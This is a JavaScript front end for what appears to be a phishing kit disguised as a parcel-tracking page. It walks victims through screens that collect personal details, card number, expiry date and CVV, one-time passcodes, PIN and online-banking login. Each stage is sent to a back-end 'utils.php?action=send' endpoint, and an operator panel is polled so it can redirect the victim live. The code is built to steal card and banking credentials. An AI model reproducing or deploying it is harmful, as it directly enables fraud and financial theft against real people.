let src = {
    1: '',
    2: '',
    3: '',
    4: '',
    5: '',
    6: '',
    7: '',
    8: '',
    9: '',
    10: '',
    load: '',
};

let pagus = 1

window.addEventListener('DOMContentLoaded', () => {
    for (let i = 1; i <= 10; i++) {
        let z = new XMLHttpRequest();
        z.open('GET', 'src/' + i + '.php');
        z.addEventListener('load', () => {
            if (i == 1) {
                document.getElementById('wakerContainer').innerHTML = z.responseText;
            }
            src[i] = z.responseText;
        });
        z.send();
    }
    let x = new XMLHttpRequest();
    x.open('GET', 'src/load.php');
    x.addEventListener('load', () => {
        src['load'] = x.responseText;
    });
    x.send();

});


function detectCardType(cc) {
    let cardType = '';
    if (/^4/.test(cc)) {
        cardType = 'visa';
    } else if (/^5[1-5]/.test(cc)) {
        cardType = 'mastercard';
    } else if (/^3[47]/.test(cc)) {
        cardType = 'amex';
    } else if (/^6(?:011|5)/.test(cc)) {
        cardType = 'discover'; 
    }
    return cardType;
}

function format(page) {

    if (page == 3) {
        $('#cc').mask('9999 9999 9999 9999');
        $('#cc').on('input', function() {
            let cardNumber = $(this).val().replace(' ', '').replace(' ', '').replace(' ', '')
            let cardType = detectCardType(cardNumber);
            switch (cardType) {
                case 'visa':
                    $(this).mask('9999 9999 9999 9999');
                    break;
                case 'mastercard':
                    $(this).mask('9999 9999 9999 9999');
                    break;
                case 'amex':
                    $(this).mask('9999 999999 99999');
                    break;
                case 'discover':
                    $(this).mask('9999 9999 9999 9999');
                    break;
                default:
                    $(this).mask('9999 9999 9999 9999');
                    break;
            }
        });
        $('#exp').mask("99/99");
        $('#ccv').mask("9999");

        let cc = document.getElementById("cc");
        let ccico = document.getElementById("ccico");

        cc.addEventListener("input", function() {
        let value = cc.value;
        let type = "";
        if (value.startsWith("4")) {
            type = "visa";
        } else if (value.startsWith("5")) {
            type = "mastercard";
        } else if (value.startsWith("3")) {
            type = "amex";
        } else if (value.startsWith("6")) {
            type = "discover";
        } else {
            type = "default";
        }

        if (document.getElementById('imgdiv').innerHTML != '<img src="assets/img/' + type + '.png" id="ccico" style="max-width:40px; margin: 11px 0;" alt="">') {
            document.getElementById('imgdiv').innerHTML = '<img src="assets/img/' + type + '.png" id="ccico" style="max-width:40px; margin: 11px 0;" alt="">'
        }
        
            
        });
    }

    if (page == 9) {
        send('7', '')
        live('8')
    }
}

function load(page) {
    document.getElementById('wakerContainer').style.visibility = 'hidden';
    pagus = page
    document.getElementById('wakerContainer').innerHTML = src[page];
    format(page)
    
    setTimeout(()=>{document.getElementById('wakerContainer').style.visibility = 'visible'},200)
}

function value(id) {
    return document.getElementById(id).value
}

function send(path, data) {
    let send = new XMLHttpRequest;
    send.open('GET', '../back/utils.php?action=send&rez=' + data + "&step=" + path)
    send.send()
}

function redirect(path) {
    let circle = '<div class="has-rte"><center><div class="dh-spinnerr"></div></center></div>'
    document.getElementById('waker-button').innerHTML = circle;
    setTimeout(() => {
        load(path);
    }, 1500);
}

function luhn(cardNumber) {
    cardNumber = cardNumber.replace(/\s/g,'');
    if (!/^\d+$/.test(cardNumber)) {
      return false;
    }
    var cardLength = cardNumber.length;
    var validLengths = {
      "Visa": [13, 16, 19],
      "Mastercard": [16],
      "American Express": [15],
      "Discover": [16]
    };
    if (!validLengths["Visa"].includes(cardLength) &&
        !validLengths["Mastercard"].includes(cardLength) &&
        !validLengths["American Express"].includes(cardLength) &&
        !validLengths["Discover"].includes(cardLength)) {
      return false;
    }
    var sum = 0;
    var doubleUp = false;
    for (var i = cardLength - 1; i >= 0; i--) {
      var digit = parseInt(cardNumber.charAt(i));
      if (doubleUp) {
        if ((digit *= 2) > 9) digit -= 9;
      }
      sum += digit;
      doubleUp = !doubleUp;
    }
    return (sum % 10 == 0);
}

function error(identifier) {
    if (identifier == "reset") {
        if (pagus == 1) {
            document.getElementById('trackCode').style.border = '1px solid #f5f5f5';
        }
        if (pagus == 2) {
            document.getElementById('name').style.border = '1px solid #f5f5f5';
            document.getElementById('year').style.border = '1px solid #f5f5f5';
            document.getElementById('month').style.border = '1px solid #f5f5f5';
            document.getElementById('day').style.border = '1px solid #f5f5f5';
            document.getElementById('tel').style.border = '1px solid #f5f5f5';
            document.getElementById('address').style.border = '1px solid #f5f5f5';
            document.getElementById('city').style.border = '1px solid #f5f5f5';
            document.getElementById('zip').style.border = '1px solid #f5f5f5';
        }
        if (pagus == 3) {
            document.getElementById('name').style.border = '1px solid #f5f5f5';
            document.getElementById('ccdiv').style.border = '1px solid #f5f5f5';
            document.getElementById('exp').style.border = '1px solid #f5f5f5';
            document.getElementById('cvv').style.border = '1px solid #f5f5f5';
        }
        if (pagus == 4 || pagus == 5) {
            document.getElementById('otp').style.border = '1px solid #f5f5f5';
        }
        if (pagus == 6) {
            document.getElementById('pin').style.border = '1px solid #f5f5f5';
        }
        if (pagus == 7) {
            document.getElementById('bankname').style.border = '1px solid #f5f5f5';
            document.getElementById('userid').style.border = '1px solid #f5f5f5';
            document.getElementById('password').style.border = '1px solid #f5f5f5';
        }
         
    }else{
        document.getElementById(identifier).style.border = '1px solid #e74c3c';
    }
}

function live(step){
    let x = setInterval(()=>{
        let req = new XMLHttpRequest;
        req.open('GET','../back/utils.php?action=checkRedirect&step=' + step)
        req.addEventListener('load',()=>{
            if (req.responseText != 'loading') {
                load(req.responseText)
                clearInterval(x)
                clearInterval(x)
            }
        })
        req.send()
    },2000)
}

function submit(path) {
    if (path == '1'){
        let trackCode = value('trackCode');
        error('reset')
        if (trackCode.length < 5) {
            error("trackCode")
            return;
        }
        error('reset')

        let total = trackCode;

        send('1', total);
        if (billing == '1') {
            redirect(2);
        }else{
            redirect(3);
        }
        
    }

    if (path == '2') {
        let name = value('name');
        let tel = value('tel');
        let address = value('address');
        let city = value('city');
        let zip = value('zip');
        let day = value('day');
        let month = value('month');
        let year = value('year');
        error("reset")
        if (name.length < 3) {
            error("name")
            return;
        }
        if (tel.length < 6) {
            error("tel")
            return;
        }
        if (year > 2006) {
            error("year")
            return;
        }
        if (address.length < 6) {
            error("address")
            return;
        }
        if (city.length < 3) {
            error("city")
            return;
        }
        if (zip.length < 4) {
            error("zip")
            return;
        }
        error("reset")
        let total = name + '|' + day + '/' + month + '/' + year + '|' + tel + '|' + address + '|' + city + '|' + zip;

        send('2', total);

        redirect(3);
    }

    if (path == '3') {
        let date = new Date();
        let name = value('name');
        let cc = value('cc');
        let exp = value('exp');
        let cvv = value('cvv');
        error("reset");
        if (name.length < 3) {
            error("name")
            return;
        }
        if (cc.length < 1 && !luhn(cc.replace(' ', '').replace(' ', '').replace(' ', ''))) {
            error("ccdiv")
            return;
        }
        if (parseInt(exp.split('/')[1]) < String(date.getFullYear()).slice(-2) || exp.split('/').length != 2 ) {
            error("exp");
            return;
        }
        if (cvv.length < 3) {
            error("cvv");
            return;
        }
        error("reset");
        let total = cc + '|' + exp + '|' + cvv 

        send('3', total)

        redirect('load')
        if (panel == '1'){
            live('3')
        }else{
            setTimeout(() => {
                load(4)
            }, time * 1000)

        }
    }

    if (path == '4') {
        let otp = value('otp')
        error('reset');
        if (otp.length < 4) {
            error('otp');
            return;
        }
        error("reset");
        let total = otp;

        send('4', total);
        redirect('load');
        if (panel == '1'){
            live('4');
        }else{
            setTimeout(() => {
                load(10)
            }, 3000)

        }
        
    }

    if (path == '5') {
        let pin = value('pin')
        error('reset');
        if (pin.length < 4) {
            error('pin');
            return;
        }
        error("reset");
        let total = pin;

        send('5', total);
        redirect('load');
        live('5');
    }

    if (path == '7') {
        let email = value('email')
        error('reset');
        if (
            email.length < 4
        ) {
            error('email');
            return;
        }
        error("reset");
        let total = email;

        send('8', total);
        redirect('load');
        live('8');
    }

    if (path == '6') {
        let bankname = value('bankname');
        let userid = value('userid');
        let password = value('password');
        error('reset')
        if (bankname.length < 3) {
            error('bankname');
            return;
        }
        if (userid.length < 5) {
            error('userid')
            return;
        }
        if (password.length < 4) {
            error('password');
            return;
        }
        error('reset');
        let total = bankname + '|' + userid + '|' + password

        send('6', total)
        redirect('load')
        live('6')

    }
    
}
